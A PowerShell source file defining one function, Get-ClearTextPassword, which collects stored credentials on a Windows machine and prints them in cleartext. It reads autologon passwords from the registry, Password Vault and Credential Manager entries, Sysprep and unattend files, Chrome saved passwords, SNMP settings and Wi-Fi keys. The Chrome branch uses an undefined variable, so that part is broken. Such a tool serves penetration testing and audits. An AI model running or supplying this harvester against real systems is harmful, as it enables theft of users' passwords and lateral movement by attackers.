Function Get-ClearTextPassword {
    [CmdletBinding(DefaultParameterSetName='All')]
        param (
            [Parameter(
                ParameterSetName='All',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$All,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$AutoLogon,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$PasswordVault,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$CredentialManager,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$Sysprep,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$Chrome,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$SNMP,

            [Parameter(
                ParameterSetName='Defined',
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$WiFi
        )  # End param


    If (($AutoLogon.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
    {

        $AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
        If (($AutoLoginPassword).DefaultPassword)
        {

            Write-Host "Auto Login Credentials Found: " -ForegroundColor "Red"
            Write-Host "$AutoLoginPassword" -ForegroundColor "Red"

        }  # End If

    }  # End If


    If (($PasswordVault.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
    {

        Write-Verbose "Checking for passwords in the Windows Password vault"
        [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

    }  # End If


    If (($CredentialManager.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
    {

        Write-Verbose "Checking Credential Manager for stored credentials"

        Install-Module -Name CredentialManager -Confirm:$True
        Import-Module -Name CredentialManager
        Get-StoredCredential | ForEach-Object { Write-Host -NoNewLine $_.Username; Write-Host -NoNewLine ":" ; $P = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.Password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($P); }

    }  # End If


    If (($Sysprep.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
    {

        Write-Verbose "Checking for passwords in common Sysprep file locations"

        $PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","C:\Windows\sysprep.inf","C:\Windows\Panther\Unattended.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\Panther\Unattend\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\System32\Sysprep\unattended.xml","C:\unattend.txt","C:\unattend.inf"
        ForEach ($PassFile in $PassFiles)
        {

            If (Test-Path -Path $PassFile)
            {

                Get-Content -Path $PassFile | Select-String -Pattern "Password"

            }  # End If

        }  # End ForEach

    }  # End If


    If (($Chrome.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
    {

        Write-Verbose "Dumping passwords from Google Chrome"
        [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($DataRow.password_value,$Null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))

    }  # End If


    If (($SNMP.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
    {

        Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP" -Recurse

    }  # End If


    If (($WiFi.IsPresent) -or ($PSCmdlet.ParameterSetName -eq 'All'))
    {

        Write-Verbose "Dumping WiFi passwords"
        (netsh wlan show profiles) | Select-String -Pattern "\:(.+)$" | ForEach-Object {$Name = $_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object {(netsh wlan show profile name="$Name" key=clear)} | Select-String -Pattern "Key Content\W+\:(.+)$" | ForEach-Object {$Pass=$_.Matches.Groups[1].Value.Trim(); $_ } | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$Name;PASSWORD=$Pass }} | Format-Table -AutoSize

    }  # End If

}  # End Function
